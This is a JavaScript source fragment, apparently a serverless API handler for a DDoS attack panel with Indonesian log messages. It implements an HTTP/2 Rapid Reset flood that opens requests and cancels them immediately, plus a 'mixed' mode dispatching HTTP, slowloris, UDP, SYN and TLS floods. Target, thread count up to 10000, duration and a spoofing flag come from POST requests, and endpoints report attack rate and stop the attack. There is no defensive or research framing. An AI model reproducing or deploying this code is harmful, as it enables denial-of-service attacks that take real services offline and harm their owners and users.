/* ---------- HTTP/2 RAPID RESET ---------- */
function http2Flood(u, duration){
  const http2 = require('http2');
  const end = Date.now()+duration*1000;
  const client = http2.connect(u.origin, { rejectUnauthorized:false });
  client.on('error',()=>STATE.err++);

  const fire = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const req = client.request({ ':path': '/?r='+Math.random(), ':method':'GET' });
    req.on('response', ()=>{ STATE.req++; req.close(http2.constants.NGHTTP2_CANCEL); });
    req.on('error',()=>STATE.err++);
    req.end();
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- MIXED (spawn semua) ---------- */
function mixedFlood(u, duration){
  const sub = Math.floor(STATE.threads / 5);
  STATE.threads = sub;
  httpFlood(u, duration);
  slowloris(u, duration);
  try { udpFlood(u, duration); } catch(e){}
  try { synFlood(u, duration); } catch(e){}
  try { tlsFlood(u, duration); } catch(e){}
}

/* ---------- HANDLER ---------- */
export default async function handler(req, res){
  if(!cors(req,res)) return;
  if(!originGuard(req,res)) return;
  if(!ratelimit(req,res)) return;

  if(req.method==='POST'){
    const body = req.body || {};
    const target  = validateTarget(body.target);
    const method  = sanitize(body.method || 'http');
    const threads = Math.min(Math.max(+body.threads||512, 1), 10000);
    const duration= Math.min(Math.max(+body.duration||30, 1), 600);
    const spoof   = body.spoof !== false;

    if(!target) return res.status(400).json({ error:'invalid target' });

    ABORT = false;
    STATE = { running:true, req:0, err:0, rps:0, threads, logs:[], lastReq:0, startTs:Date.now(), endTs:Date.now()+duration*1000, target, method, spoof };
    log(`spawn ${method.toUpperCase()} → ${target} | t=${threads} d=${duration}s spoof=${spoof}`, 'ok');

    const u = new URL(target);
    const runner = {
      http:httpFlood, slowloris, udp:udpFlood, syn:synFlood, tls:tlsFlood,
      http2:http2Flood, mixed:mixedFlood
    }[method] || httpFlood;
    try { runner(u, duration); } catch(e){ log('runner error: '+e.message,'err'); }

    const monitor = setInterval(() => {
      const now = Date.now();
      STATE.rps = Math.round(STATE.req / ((now - STATE.startTs)/1000 || 1));
      if(ABORT || now > STATE.endTs){
        clearInterval(monitor);
        STATE.running = false;
        log('attack selesai.','ok');
      }
    }, 1000);

    return res.json({ ok:true, workers:threads, method, duration, target, spoof });
  }

  if(req.method==='DELETE'){
    ABORT = true; STATE.running = false;
    log('dihentikan manual.','warn');
    return res.json({ stopped:true });
  }

  if(req.method==='GET'){
    const logs = STATE.logs.splice(0, STATE.logs.length);
    return res.json({ running: STATE.running, req: STATE.req, err: STATE.err, rps: STATE.rps, threads: STATE.threads, logs });
  }

  res.status(405).json({ error:'method not allowed' });
}
